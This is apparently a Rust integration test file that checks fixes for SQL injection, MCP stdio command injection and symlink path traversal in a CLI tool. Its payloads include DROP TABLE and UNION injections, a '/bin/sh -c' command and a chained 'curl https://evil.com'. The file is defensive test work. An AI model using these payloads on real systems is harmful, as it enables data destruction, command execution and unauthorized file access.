//! Security vulnerability test cases
//!
//! These tests verify the security vulnerabilities identified in the security review
//! and validate that fixes properly address them.
//!
//! IMPORTANT: These tests demonstrate ACTUAL vulnerabilities and should be run
//! in a safe, isolated environment only.

use std::fs;
use std::path::PathBuf;
use std::process::Command;

/// Test case for Vuln 1: SQL Injection in Database Query Command
///
/// This test verifies that the database query command is vulnerable to SQL injection
/// and that the fix properly sanitizes input.
#[test]
#[ignore] // Run explicitly with: cargo test test_sql_injection_db_query --ignored
fn test_sql_injection_db_query() {
    // Setup: Assume ClickHouse is running (this is an integration test)

    // VULNERABILITY TEST: SQL injection payload
    let malicious_query = "SELECT 1; DROP TABLE IF EXISTS osvm.test_table; --";

    let output = Command::new("cargo")
        .args(["run", "--", "db", "query", "--query", malicious_query])
        .output()
        .expect("Failed to execute command");

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    // BEFORE FIX: This would execute both SELECT and DROP statements
    // The test table would be dropped

    // AFTER FIX: Should reject the query with validation error
    assert!(
        !output.status.success()
            || stderr.contains("Invalid")
            || stderr.contains("not allowed")
            || stderr.contains("rejected"),
        "SQL injection should be blocked. stdout: {}, stderr: {}",
        stdout,
        stderr
    );

    // Additional test: UNION-based injection
    let union_injection =
        "SELECT user FROM osvm.users UNION ALL SELECT table_name FROM system.tables";

    let output2 = Command::new("cargo")
        .args(["run", "--", "db", "query", "--query", union_injection])
        .output()
        .expect("Failed to execute command");

    let stderr2 = String::from_utf8_lossy(&output2.stderr);

    // Should block UNION attempts
    assert!(
        !output2.status.success() || stderr2.contains("UNION"),
        "UNION-based SQL injection should be blocked"
    );
}

/// Test case for Vuln 2: Command Injection in MCP Stdio Server
///
/// This test verifies that MCP stdio server initialization is vulnerable to
/// command injection and that the fix properly validates commands.
#[test]
#[ignore] // Run explicitly with: cargo test test_command_injection_mcp --ignored
fn test_command_injection_mcp() {
    // VULNERABILITY TEST: Command injection via stdio URL
    let malicious_url = "/bin/sh -c 'echo PWNED > /tmp/osvm_test_pwned.txt'";

    let output = Command::new("cargo")
        .args([
            "run",
            "--",
            "mcp",
            "add",
            "malicious-test",
            "--url",
            malicious_url,
            "--transport",
            "stdio",
        ])
        .output()
        .expect("Failed to execute command");

    let stderr = String::from_utf8_lossy(&output.stderr);

    // BEFORE FIX: The malicious command would be accepted and later executed

    // AFTER FIX: Should reject with validation error
    assert!(
        !output.status.success()
            || stderr.contains("Invalid")
            || stderr.contains("not allowed")
            || stderr.contains("command"),
        "Command injection should be blocked. stderr: {}",
        stderr
    );

    // Verify the malicious command was NOT executed
    let pwned_file = PathBuf::from("/tmp/osvm_test_pwned.txt");
    assert!(
        !pwned_file.exists(),
        "Malicious command should not have been executed"
    );

    // Test semicolon-based command chaining
    let chained_command = "node /tmp/test.js; curl https://evil.com";

    let output2 = Command::new("cargo")
        .args([
            "run",
            "--",
            "mcp",
            "add",
            "chained-test",
            "--url",
            chained_command,
            "--transport",
            "stdio",
        ])
        .output()
        .expect("Failed to execute command");

    let stderr2 = String::from_utf8_lossy(&output2.stderr);

    assert!(
        !output2.status.success() || stderr2.contains("Invalid"),
        "Command chaining should be blocked"
    );

    // Cleanup
    let _ = fs::remove_file(&pwned_file);
}

/// Test case for Vuln 3: Path Traversal in Blockchain Account Reading
///
/// This test verifies that account file reading is vulnerable to path traversal
/// via symlinks and that the fix properly validates file types.
#[test]
#[ignore] // Run explicitly with: cargo test test_path_traversal_accounts --ignored
fn test_path_traversal_accounts() {
    // Setup: Create test snapshot directory structure
    let test_dir = PathBuf::from("/tmp/osvm_security_test_snapshots");
    let accounts_dir = test_dir.join("accounts");
    fs::create_dir_all(&accounts_dir).expect("Failed to create test directories");

    // Create a sensitive file to target
    let sensitive_file = PathBuf::from("/tmp/osvm_test_sensitive.txt");
    fs::write(&sensitive_file, "SENSITIVE_DATA_12345").expect("Failed to create test file");

    // VULNERABILITY TEST: Create symlink in accounts directory
    let symlink_path = accounts_dir.join("malicious_account");

    #[cfg(unix)]
    {
        use std::os::unix::fs::symlink;
        symlink(&sensitive_file, &symlink_path).expect("Failed to create symlink");
    }

    // Run the sync command
    let output = Command::new("cargo")
        .args([
            "run",
            "--",
            "db",
            "sync",
            "--snapshot-dir",
            test_dir.to_str().unwrap(),
        ])
        .output()
        .expect("Failed to execute command");

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    // BEFORE FIX: Would read the sensitive file and potentially expose it
    // Check if sensitive data appears in output

    // AFTER FIX: Should detect and reject symlinks
    assert!(
        stderr.contains("symlink")
            || stderr.contains("Invalid file type")
            || !stdout.contains("SENSITIVE_DATA_12345"),
        "Symlink traversal should be blocked. stdout: {}, stderr: {}",
        stdout,
        stderr
    );

    // Cleanup
    let _ = fs::remove_file(&symlink_path);
    let _ = fs::remove_file(&sensitive_file);
    let _ = fs::remove_dir_all(&test_dir);
}

/// Test case for Vuln 4: SQL Injection in Batch Account Inserts
///
/// This test verifies that batch account inserts are vulnerable to SQL injection
/// via malicious account data and that the fix properly escapes all data.
#[test]
#[ignore] // Run explicitly with: cargo test test_sql_injection_batch_insert --ignored
fn test_sql_injection_batch_insert() {
    // Setup: Create malicious account file with SQL injection in data
    let test_dir = PathBuf::from("/tmp/osvm_security_test_batch");
    let accounts_dir = test_dir.join("accounts");
    fs::create_dir_all(&accounts_dir).expect("Failed to create test directories");

    // Create account file with malicious data
    // The first 100 bytes should contain: 1,2,3); DROP TABLE osvm.test; --
    let malicious_data: Vec<u8> = vec![
        49, 44, 50, 44, 51, 41, 59, 32, 68, 82, 79, 80, 32, 84, 65, 66, 76, 69, 32, 111, 115, 118,
        109, 46, 116, 101, 115, 116, 59, 32, 45, 45,
    ];

    // Pad to make a valid-looking account file (this is simplified)
    let mut account_bytes = vec![0u8; 128]; // Placeholder for account metadata
    account_bytes.extend_from_slice(&malicious_data);

    let malicious_account_file = accounts_dir.join("malicious_account.bin");
    fs::write(&malicious_account_file, &account_bytes).expect("Failed to write malicious account");

    // Run the sync command
    let output = Command::new("cargo")
        .args([
            "run",
            "--",
            "db",
            "sync",
            "--snapshot-dir",
            test_dir.to_str().unwrap(),
        ])
        .output()
        .expect("Failed to execute command");

    let stderr = String::from_utf8_lossy(&output.stderr);

    // BEFORE FIX: The SQL injection would be executed, dropping the test table

    // AFTER FIX: Should properly escape the data or use parameterized queries
    // The malicious SQL should NOT be executed

    // We can't directly check if a table was dropped without ClickHouse access,
    // but we can verify error handling or warnings
    assert!(
        output.status.success() || stderr.contains("Failed to insert"),
        "Batch insert should handle malicious data safely. stderr: {}",
        stderr
    );

    // Cleanup
    let _ = fs::remove_dir_all(&test_dir);
}

/// Positive test: Verify legitimate queries still work after fixes
#[test]
#[ignore] // Run explicitly with: cargo test test_legitimate_query_works --ignored
fn test_legitimate_query_works() {
    // After implementing fixes, legitimate queries should still work
    let safe_query = "SELECT COUNT(*) FROM osvm.cli_commands LIMIT 10";

    let output = Command::new("cargo")
        .args(["run", "--", "db", "query", "--query", safe_query])
        .output()
        .expect("Failed to execute command");

    // Should succeed or give clear error if ClickHouse not running
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        output.status.success() || stderr.contains("connection"),
        "Legitimate queries should work. stderr: {}",
        stderr
    );
}

/// Positive test: Verify legitimate MCP servers still work after fixes
#[test]
#[ignore]
fn test_legitimate_mcp_server_works() {
    // Legitimate node command should still work
    let output = Command::new("cargo")
        .args([
            "run",
            "--",
            "mcp",
            "add",
            "legitimate-server",
            "--url",
            "/usr/bin/node",
            "--transport",
            "stdio",
        ])
        .output()
        .expect("Failed to execute command");

    let stderr = String::from_utf8_lossy(&output.stderr);

    // Should succeed with valid command
    assert!(
        output.status.success() || stderr.contains("added"),
        "Legitimate MCP server should be accepted. stderr: {}",
        stderr
    );

    // Cleanup
    let _ = Command::new("cargo")
        .args(["run", "--", "mcp", "remove", "legitimate-server"])
        .output();
}

#[cfg(test)]
mod validation_tests {
    /// Test SQL query validation logic (unit test for the fix)
    #[test]
    fn test_sql_query_validation() {
        // This would test the validation function directly once implemented
        // Example:
        // assert!(is_safe_query("SELECT * FROM table"));
        // assert!(!is_safe_query("DROP TABLE users"));
        // assert!(!is_safe_query("SELECT * FROM users; DELETE FROM logs"));
    }

    /// Test command path validation logic (unit test for the fix)
    #[test]
    fn test_command_path_validation() {
        // This would test the command validation function
        // Example:
        // assert!(is_safe_command("/usr/bin/node"));
        // assert!(!is_safe_command("/bin/sh -c 'malicious'"));
        // assert!(!is_safe_command("node; curl evil.com"));
    }
}
